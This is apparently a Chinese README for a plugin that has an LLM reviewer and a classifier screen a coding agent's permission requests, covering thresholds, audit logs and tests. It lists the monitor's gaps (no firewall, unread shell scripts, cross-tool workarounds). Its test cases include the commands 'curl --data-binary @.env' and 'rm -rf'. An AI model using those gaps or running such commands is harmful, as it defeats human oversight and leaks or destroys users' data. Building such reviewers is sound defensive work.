# Auto permission review

本仓库和完整安装包提供 `dscode-auto-review` 插件。它为需要审批的动作调用独立 LLM 请求，返回允许、拒绝或转人工；保留工作区写入沙箱和现有联网行为。不是 Codex 自带 reviewer，也不是所有操作都经过检查的安全代理。

## 使用

重启 `dscode` 加载插件。新会话默认 auto；已有会话和已保存的默认设置保留原值，可以显式切换：

```text
/permission auto
/permission ask
/review-usage
```

`auto` 和 `ask` 都是 `workspace-write + approval: ask`，区别是前者让插件先审核。底层 `never` 仍是拒绝审批请求，不代表自动允许。Computer Use 的应用授权和敏感动作确认始终交给用户。

## 触发范围

- 工作区文件修改、普通 Shell、已有权限下的 curl/CLI 联网：不新增审批，也不调用审核模型。
- Shell/文件工具申请额外权限：进入原生审批通道，auto 模式下由 reviewer 先判断。
- Chrome 的明确只读工具 `list_pages`、`take_snapshot`、`get_console_message`、`list_console_messages`、`get_network_request`、`list_network_requests`、`performance_analyze_insight`：不新增审批。
- 其他 `mcp__*` 工具：在执行前进入审批，包括 Chrome 导航、点击、脚本执行、上传、截图等。未知 MCP 工具不因为名称像只读就放行。
- 其他插件通过原生审批接口发起的请求：如果无法绑定到实际待执行工具参数，转人工。

这不是全局网络防火墙。原本允许执行的 `curl POST` 或使用已认证 CLI 的外部操作不会天然触发 auto。Shell 中脚本的实际内容也不会被 reviewer 自动读取。跨工具等价绕行由审核指令约束，不能声称有完整语义识别；完全相同的已拒绝动作在本轮没有新用户指令时会直接拒绝。

## 输入和授权

插件在工具执行前记录待执行的不可变参数，以 agent 和 call ID 绑定审核请求。每次允许只用于该次调用，无永久授权缓存。审核模型没有执行工具，也不接收主 agent 的推理或整段工具输出。

审核输入是具体工具参数、cwd、直接用户消息和最近拒绝理由。不会额外读取 `.env`、配置凭据或 secret 文件。常见凭据格式会脱敏；动作参数疑似含凭据时直接转人工，不把失真的动作交给模型批准。该检测不是完整 DLP，无法保证识别所有任意格式的秘密，参数和用户文本中不要直接粘贴凭据。

动作 JSON 超过 12,000 字符、全部直接用户文本超过 8,000 字符，或缺少直接用户指令时转人工，不通过截掉授权约束来强行审核。不会把 agent 自己生成的摘要当作用户授权。长会话可能因此更多地转人工，这是第一版的明确限制。

## 模型与成本

默认沿用 agent 最近实际请求的 provider/model，但使用独立、精简的审核上下文。也可以在 `config/harness.local.yml` 指定已经配置好凭据的另一个模型：

```yaml
- id: dscode-auto-review
  config:
    provider: your-configured-provider
    model: your-reviewer-model
    timeoutMs: 30000
    maxOutputTokens: 768
    maxReviewsPerTurn: 20
```

provider/model 必须同时设置或都留空。每次最多请求 768 输出 tokens，超时 30 秒；每个 agent 每轮最多发起 20 次审核模型调用，超过后转人工。这个次数上限不是账单金额上限，供应商/底层适配器重试、思考 token 和定价由模型配置决定。

`/review-usage` 显示本会话决定数、模型尝试数、已报告的输入/输出 tokens、累计审核耗时和缺少完整 usage 的尝试。缺失 usage 不当作零费用。审核失败、截断、无效 JSON、超时均转人工；如果人工通道也不可用，原生审批服务拒绝执行。

连续三次拒绝会取消当前 agent 的本轮运行。显式拒绝不会自动转成另一条“人工允许”路径；agent 收到拒绝理由和禁止等价绕行的说明。用户可以用 `/permission ask` 后提供新的明确指令。

## 持久化与分发

权限选择由 DSH 原生会话事件保存；原生 approval asked/decided 继续记录实际审批结果。审核理由、动作 hash、usage 和耗时另存于 `.runtime/auto-review/<session-id-sha256>.jsonl`（文件权限 0600）。不记录原始命令、请求正文、审核提示或完整模型响应。此 sidecar 是审核器的判断记录；转人工后的最终允许/拒绝以原生会话审批日志为准。

rc.1 的会话读取器不接受未知事件类型，因此没有把自定义审核事件硬塞进会话日志。备份时保留整个 `.runtime`，同时保留审核记录。

`npm run dist` 的完整安装包包含此插件。正式 npm/Hub bundle 包含 reviewer；旧 `npm run release` 仅导出基础组合，不能代替 `npm run release:hub` 生成的完整发行版。

## Jev 快路径（可选）

自动审核的问题本质是一次「在给定上下文里选一个答案」，不需要一个会写长文的模型。挂载 `dscode-jev` 后，审核会先问 TypeSafe Jev（经 OpenRouter 的 alpha Decisions 端点 `POST /api/alpha/decisions`），**一次请求**同时给出四个回答：

- `choice`：`allow` / `ask` / `deny`，附各选项概率与 `confidence`；
- `noul authorized`：保留的指令是否**明确授权了这次具体动作**（含目标与效果）；
- `score`：做错时有多难回滚（0–3 档，可落在档位之间）；
- `noul credential_risk`：是否涉及凭据、令牌或其他机密。

判定顺序在代码里，而且**放行与拒绝的门槛刻意不对称**——放行是最危险的方向，拒绝只是「请不要这么做」：

1. **自动拒绝**：`deny` 且（置信度 ≥ `autoDeny`(0.95) 且 `P(deny)` ≥ `autoDenyProbability`(0.9)）**或**（置信度 ≥ `autoDenyCorroborated`(0.9) 且 `score ≥ destructiveCeiling`(2) 或凭据风险 ≥ `credentialRisk`(0.5) 至少一项已越线）。若 `authorized ≥ authorizedVeto`(0.6)——即指令看起来就是要求它做这件事——则**否决自动拒绝、改为转人工**：错杀一次拒绝的代价是用户要的活没做，而且连提示都看不到。
2. **已授权时转交模型深审**：凭据风险 ≥ 0.5、`score ≥ 2`、`choice` 不是 `allow`、或置信度 < `autoAllow`(0.85)，这四条都只守放行方向、都不构成拒绝。若 `authorized ≥ authorizedVeto`(0.6)——指令看起来就是要它做这件事——它们不再直接找人，而是返回 `defer`，由 reviewer 模型看着完整待执行参数与保留指令决断：Jev 的分数偏粗，而本部署本来就允许常规网络访问、也允许 CLI 使用它自己保存的凭据。reviewer 自己判 `human` 时仍然会找人，`defer` 从不会被当成放行。
3. **自动放行**：`allow` 且置信度 ≥ `autoAllow`(0.85)，且未触发第 2 步。
4. 其余（未到 `authorizedVeto` 的 `ask`、不够自信、越线但未被拒绝）→ 转人工。

一次 `defer` 在审计里留下两行：先记 Jev 自己的判定与风险分数（`decision: deferred`，带 `credentialRisk`、`destructive`、`authorized`），再记 reviewer 模型的实际裁决；只有 `allow` 会真正放行。也就是说第 2 步把凭据与不可撤销风险从「硬停」改成了「第二个模型判断 + 人工兜底」——这是刻意的取舍，代价是这两个信号不再单独一票否决，收益是用户已明确要求的提权（例如发布流程里必须出沙箱的验证）不会每次都打断人。想恢复硬停就把 `authorizedVeto` 调高于 1（或按下面的方式关掉 Jev）。

Jev 未配置（解析不到 `OPENROUTER_API_KEY`）、未启用、超时、报错或返回不可用时，一律返回「无判定」，自动审核继续走原来的 reviewer 模型——**Jev 故障只退回到旧行为，不会放宽任何权限**。

发出去的 `state` 只有两项：待执行的调用本身，以及本会话保留的直接用户指令；两者各自截断到 8000 字符，不含凭据。

配置在 `plugins/jev` 行：`enabled`（默认 true）、`model`（默认 `~typesafe/jev-latest`）、`endpoint`、`apiKeyEnv`（默认 `OPENROUTER_API_KEY`）、`timeoutMs`（默认 8000），以及阈值 `autoAllow`(0.85)、`autoDeny`(0.95)、`autoDenyProbability`(0.9)、`autoDenyCorroborated`(0.9)、`authorizedVeto`(0.6)、`credentialRisk`(0.5)、`destructiveCeiling`(2)。设为 `enabled: false` 或移除该行即回到纯模型审核。

2026-09-17 实测两次（同四个用例，`~typesafe/jev-latest` → `typesafe/jev-1.13-20260917`，provider TypeSafe）：单次 96–813 ms、约 $0.000025（output 计费为 0）。第一次（只有门槛、没有自动拒绝）`git status --short` → allow；`git push --force origin main`（deny 0.92 / score 2.99）与 `curl --data-binary @.env …`（deny 0.98 / cred 0.94）→ 转人工；`rm -rf ~/Documents/notes`（deny 0.90 / score 1.97）→ deny。第二次（本节的非对称策略）四例依次为 allow、deny（0.98 / P(deny) 0.99）、deny（0.99 / 1.00）、deny（0.97 / 0.98）；`authorized` 在常规读取上是 0.83、在三个危险动作上是 0.03。**同一动作两次运行的置信度会漂移**（`rm -rf` 从 0.90 到 0.97），这正是要求「决定性拒绝需要两个信号一致」、并用审计记录调阈值的原因。

阈值注意：Jev 的概率只在**统计意义**上校准，`confidence` 不是逐次保证。建议用本插件写入的审计记录（`.runtime/auto-review/*.jsonl` 含 decision、source、choice、confidence、denyProbability、authorized、usage 与耗时）对齐阈值，而不是照搬默认值。

## 验证

`npm test` 覆盖审核规则入口、参数绑定、取消、超时、无效响应、凭据拦截、模型预算、模式切换、重复拒绝和停止。`tests/jev.test.mjs` 用 mock transport 覆盖请求形态、答案解析、阈值判定、超时与失败兜底；`tests/auto-review.test.mjs` 额外覆盖「Jev 判定不花 reviewer 请求」「Jev 拒绝计入连续拒绝」「Jev 不可用时回退到模型审核」，以及「已授权时 Jev 把守卫交给 reviewer 模型、而 reviewer 自己判人工时仍会找人」。

`npm run doctor` 使用真实 DSH agent 和工具管线、确定性本地 LLM adapter，验证允许执行、拒绝不执行、无效响应转测试人工审批器、usage 记录及会话恢复。没有调用付费远程模型；实际模型的审核质量、延迟和费用尚待真实使用验证。模拟人工审批器只存在 doctor 的测试 overlay 中。
